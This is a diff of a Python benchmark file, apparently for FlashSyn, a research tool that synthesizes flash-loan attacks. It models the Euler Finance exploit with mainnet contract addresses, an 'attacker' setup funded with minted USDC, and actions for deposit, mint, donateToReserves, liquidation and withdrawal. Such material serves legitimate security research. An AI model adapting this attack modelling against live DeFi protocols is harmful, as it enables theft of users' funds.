@@ -17,7 +17,7 @@ from synthesizer import *
 
 class eulerAction(ActionPro):
     # This is a vector of global states  
-    initialBalances = {"USDC": 400000000}  # TODO: initial capital, need to be consistent with the foundry script
+    initialBalances = {"USDC": 400000000}  # initial capital, need to be consistent with the foundry script
     ## initial balances of the attacker
     # initially the attacker has 400000000 USDC
 
@@ -25,120 +25,14 @@ class eulerAction(ActionPro):
 
     # Used to calculate the profit = (weighted sum of final balances - 
     # ETH is the only token of interest
-    TokenPrices = {"USDC": 1.0}    # TODO: token prices at the specific block
+    TokenPrices = {"USDC": 1.0}    # token prices at the specific block
 
     TargetTokens = TokenPrices.keys()    # Don't change: token of interest
 
 
-
-    # TODO: 
-    # It is the start of the foundry script above all testExample_ functions
-    start_str = '''// SPDX-License-Identifier: MIT
-pragma solidity >0.4.21;
-
-// exploit: https://phalcon.xyz/tx/eth/0x465a6780145f1efe3ab52f94c006065575712d2003d83d85481f3d110ed131d9
-
-import {DSTest} from "ds-test/test.sol";
-import {Utilities} from "./utils/Utilities.sol";
-import {console} from "./utils/Console.sol";
-import {Vm} from "forge-std/Vm.sol";
-import {stdCheats} from "forge-std/stdlib.sol";
-import {Strings} from "mylib/StringCon.sol";
-import "ds-test/test.sol";
-
-
-
-interface IUSDC {
-    function approve(address spender, uint256 value) external returns (bool);
-    function balanceOf(address account) external view returns (uint256);
-    function burn(uint256 _amount) external;
-    function configureMinter(address minter, uint256 minterAllowedAmount) external returns (bool);
-    function decimals() external view returns (uint8);
-    function masterMinter() external view returns (address);
-    function mint(address _to, uint256 _amount) external returns (bool);
-    function transfer(address to, uint256 value) external returns (bool);
-}
-
-interface IEToken {
-    function burn(uint256 subAccountId, uint256 amount) external;
-    function deposit(uint256 subAccountId, uint256 amount) external;
-    function balanceOf(address account) external view returns (uint256);
-    function donateToReserves(uint256 subAccountId, uint256 amount) external;
-    function mint(uint256 subAccountId, uint256 amount) external;
-    function touch() external;
-    function withdraw(uint256 subAccountId, uint256 amount) external;
-}
-
-interface IEulerProtocol {
-    function dispatch() external;
-    function moduleIdToImplementation(uint256 moduleId) external view returns (address);
-    function moduleIdToProxy(uint256 moduleId) external view returns (address);
-    function name() external view returns (string memory);
-}
-
-interface IDToken {
-    function balanceOf(address account) external view returns (uint256);
-}
-
-
-interface ILiquidation {
-    function checkLiquidation(address liquidator, address violator, address underlying, address collateral)
-        external
-        returns (LiquidationOpportunity memory liqOpp);
-    function liquidate(address violator, address underlying, address collateral, uint256 repay, uint256 minYield)
-        external;
-}
-
-struct LiquidationOpportunity {
-    uint256 repay;
-    uint256 yield;
-    uint256 healthScore;
-    // Only populated if repay > 0:
-    uint256 baseDiscount;
-    uint256 discount;
-    uint256 conversionRate;
-}
-
-contract euler is DSTest, stdCheats {
-    Vm internal constant vm = Vm(HEVM_ADDRESS);
-    address payable constant attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
-    address payable constant attacker2 = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker2"))))));
-    IUSDC internal constant USDC = IUSDC(address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48));
-    IEToken internal constant EToken = IEToken(address(0xbb0D4bb654a21054aF95456a3B29c63e8D1F4c0a));
-    IEulerProtocol internal constant EulerProtocol = IEulerProtocol(address(0x27182842E098f60e3D576794A5bFFb0777E025d3));
-    IEToken internal constant eUSDC = IEToken(address(0xEb91861f8A4e1C12333F42DCE8fB0Ecdc28dA716));
-    IDToken internal constant dUSDC = IDToken(address(0x84721A3dB22EB852233AEAE74f9bC8477F8bcc42));
-    ILiquidation internal constant Liquidation = ILiquidation(address(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34));
-    uint256 repay; uint256 yield;
-    LiquidationOpportunity temp;
-    
-    function setUp() public {
-        vm.label(attacker, "Attacker");
-        address MasterMinter = USDC.masterMinter();
-        vm.startPrank(MasterMinter);
-        USDC.configureMinter(address(0x9BEF5148fD530244a14830f4984f2B76BCa0dC58), 2 ** 256 - 1);
-        vm.stopPrank();
-        startHoax(address(0x9BEF5148fD530244a14830f4984f2B76BCa0dC58));
-        USDC.mint(address(attacker), 400000000e6);
-        vm.stopPrank();
-
-        // start to
-        vm.startPrank(attacker);
-        
-        USDC.approve(address(EulerProtocol), type(uint256).max);
-    }
-
-    function profitSummary() public view returns (string memory) {
-        string memory profitSummaryString = Strings.append("FlashSyn USDC balance: ", USDC.balanceOf(address(attacker)) / 1e6);
-        return profitSummaryString;
-    }
-    '''
-
-
-
-    # TODO: how can we use return value of profitSummary() of Foundry to calculate profit?
+    # how can we use return value of profitSummary() of Foundry to calculate profit?
     def calcProfit(stats): 
-        if stats == None:
+        if stats is None:
             return 0
         # We choose to calculate profit here because it's hard to handle 
         # integer subtraction in the Solidity.
@@ -170,8 +64,6 @@ contract euler is DSTest, stdCheats {
         print("in total it takes %f seconds" % (end - start))
 
 
-
-    # TODO. 
     # After executing initialPass(), paste the data points printed to this function.
     @classmethod
     def runinitialPass(cls):
@@ -201,14 +93,12 @@ contract euler is DSTest, stdCheats {
 class eulerDeposit(eulerAction):
     approximators = NumericalApproximatorsPro()
 
-    # TODO
     numInputs = 1        # num of parameters undetermined
     tokensIn = ['USDC']    # the token taken from the attacker
     tokensOut = ['eUSDC']    # the token given to the attacker
     range = [0, 200000000]     # a range of parameters we would like FlashSyn to try
 
 
-    # TODO
     # part of foundry script used to execute the action
     @classmethod
     def actionStr(cls):
@@ -217,7 +107,6 @@ class eulerDeposit(eulerAction):
         '''
         return action
 
-    # TODO
     # part of foundry script used to collect data points for the action
     @classmethod
     def collectorStr(cls):
@@ -232,7 +121,6 @@ class eulerDeposit(eulerAction):
         return action
 
 
-    # TODO
     # How are we gonna use the output of the approximator?
     # We need to update the global states and change user balances
     @classmethod
@@ -247,12 +135,10 @@ class eulerDeposit(eulerAction):
 
 class eulerMint(eulerAction):
     approximators = NumericalApproximatorsPro()
-    # TODO
     numInputs = 1     # num of parameters undetermined
     tokensIn = ['eUSDC']    # the token taken from the attacker
     tokensOut = ['eUSDC', 'dUSDC']   # the token given to the attacker
     range = [0, 2000000000]    # a range of parameters we would like FlashSyn to try
-    # TODO
     # part of foundry script used to execute the action
     @classmethod
     def actionStr(cls):
@@ -260,7 +146,6 @@ class eulerMint(eulerAction):
         eUSDC.mint(0, $$ * 1e6);\n'''
         return action
 
-    # TODO
     # part of foundry script used to collect data points for the action
     @classmethod
     def collectorStr(cls):
@@ -273,7 +158,6 @@ class eulerMint(eulerAction):
         return action
 
 
-    # TODO
     # How are we gonna use the output of the approximator?
     # We need to update the global states and change user balances
     @classmethod
@@ -292,13 +176,11 @@ class eulerLiquidateWithdraw(eulerAction):
     # one approximator for one value
     approximators = NumericalApproximatorsPro()
 
-    # TODO
     numInputs = 0     # num of parameters undetermined
     tokensIn = ['dUSDC', 'eUSDC']    # the token taken from the attacker
     tokensOut = ['USDC']   # the token given to the attacker
 
 
-    # TODO
     # part of foundry script used to execute the action
     @classmethod
     def actionStr(cls):
@@ -317,7 +199,6 @@ class eulerLiquidateWithdraw(eulerAction):
         '''
         return action
 
-    # TODO
     # part of foundry script used to collect data points for the action
     @classmethod
     def collectorStr(cls):
@@ -340,7 +221,6 @@ class eulerLiquidateWithdraw(eulerAction):
         return action
 
 
-    # TODO
     # How are we gonna use the output of the approximator?
     # We need to update the global states and change user balances
     @classmethod
@@ -356,13 +236,11 @@ class eulerDonate(eulerAction):
     # one approximator for one value
     approximators = NumericalApproximatorsPro()
 
-    # TODO
     numInputs = 1     # num of parameters undetermined
     tokensIn = ['eUSDC']    # the token taken from the attacker
     tokensOut = []   # the token given to the attacker
     range = [0, 2000000000]    # a range of parameters we would like FlashSyn to try
 
-    # TODO
     # part of foundry script used to execute the action
     @classmethod
     def actionStr(cls):
@@ -371,7 +249,6 @@ class eulerDonate(eulerAction):
         '''
         return action
 
-    # TODO
     # part of foundry script used to collect data points for the action
     @classmethod
     def collectorStr(cls):
@@ -384,9 +261,6 @@ class eulerDonate(eulerAction):
         return action
 
 
-
-
-    # TODO
     # How are we gonna use the output of the approximator?
     # We need to update the global states and change user balances
     @classmethod
@@ -400,13 +274,11 @@ class eulerBurn(eulerAction):
     # one approximator for one value
     approximators = NumericalApproximatorsPro()
 
-    # TODO
     numInputs = 1     # num of parameters undetermined
     tokensIn = ['eUSDC', 'dUSDC']    # the token taken from the attacker
     tokensOut = []   # the token given to the attacker
     range = [0, 200000]    # a range of parameters we would like FlashSyn to try
 
-    # TODO
     # part of foundry script used to execute the action
     @classmethod
     def actionStr(cls):
@@ -415,7 +287,6 @@ class eulerBurn(eulerAction):
         '''
         return action
 
-    # TODO
     # part of foundry script used to collect data points for the action
     @classmethod
     def collectorStr(cls):
@@ -431,8 +302,6 @@ class eulerBurn(eulerAction):
         return action
 
 
-
-    # TODO
     # How are we gonna use the output of the approximator?
     # We need to update the global states and change user balances
     @classmethod
@@ -449,13 +318,11 @@ class eulerTouch(eulerAction):
     # one approximator for one value
     approximators = NumericalApproximatorsPro()
 
-    # TODO
     numInputs = 0     # num of parameters undetermined
     tokensIn = []    # the token taken from the attacker
     tokensOut = []   # the token given to the attacker
     range = []    # a range of parameters we would like FlashSyn to try
 
-    # TODO
     # part of foundry script used to execute the action
     @classmethod
     def actionStr(cls):
@@ -479,9 +346,6 @@ class eulerTouch(eulerAction):
         pass
 
 
-
-
-
 def flashsyn_setup():
     config.ExecutionMode = DVD
     config.command = "./run.sh euler ETH 16818064"
@@ -492,68 +356,4 @@ def flashsyn_setup():
     return {"wrapper": eulerAction, "actions": actions,
             "dependencies": dependencies, "max_len": 6}
 
-
-def main():
-    # Do not change.
-    config.ExecutionMode = DVD  # DVD for normal cases.
-
-    config.command = "./run.sh euler ETH 16818064"  # the command used by the foundry to run the contract
-    config.benchmarkName = "euler"  # the name of the benchmark, simply for distinguishing between different benchmarks
-
-    # ===========================================================================================================
-    # =========================== run dependencyCheck.py to get the following information =====================
-    # ===========================================================================================================
-
-    action1 = eulerDeposit
-    action2 = eulerBurn
-    action3 = eulerTouch
-    action4 = eulerDonate
-    action5 = eulerMint
-    action6 = eulerLiquidateWithdraw
-
-    action_list = [action1, action2, action3, action4, action5, action6]
-
-    # prestate_dependency means executing the actions inside the actionX_prestate_dependency vector 
-    # will alter the prestates of actionX. It is used to reach a wider range of data points
-    # If you are unsure about the prestates, just list all actions inside the actionX_prestate_dependency
-    action1_prestate_dependency = [action2, action3, action4, action5, action6] + [action1]
-    action2_prestate_dependency = [action1, action3, action4, action5, action6] + [action2]
-    action3_prestate_dependency = [action1, action2, action4, action5, action6] + [action3]
-    action4_prestate_dependency = [action1, action2, action3, action5, action6] + [action4]
-    action5_prestate_dependency = [action1, action2, action3, action4, action6] + [action5]
-    action6_prestate_dependency = [action1, action2, action3, action4, action5] + [action6]
-
-    actionDependencies = [action1_prestate_dependency, action2_prestate_dependency, \
-                          action3_prestate_dependency, action4_prestate_dependency, \
-                          action5_prestate_dependency, action6_prestate_dependency]
-
-    actionDependency = generateActionDependency(action_list, actionDependencies)
-
-    AttackDAGGenerator.setActionDependency(actionDependency)
-
-
-    # ===========================================================================================================
-    # =========================== Set up execution parameters ===================================================
-    # ===========================================================================================================
-
-
-    ActionWrapper = eulerAction
-    ActionWrapper.initialPass(action_list, actionDependencies, ActionWrapper)
-
-
-    # CounterExampleLoop = True
-    # Pruning = True
-    # maxSynthesisLen = 6  
-
-    # ActionWrapper.runinitialPass()
-    # config.benchmarkName = "euler"
-    # config.processNum = 1
-
-    # Synthesizer = synthesizer(action_list, eulerAction, config.processNum)
-    # Synthesizer.synthesis(maxSynthesisLen, Pruning, CounterExampleLoop)
-
-
-
-if __name__ == "__main__":
-    main()
 
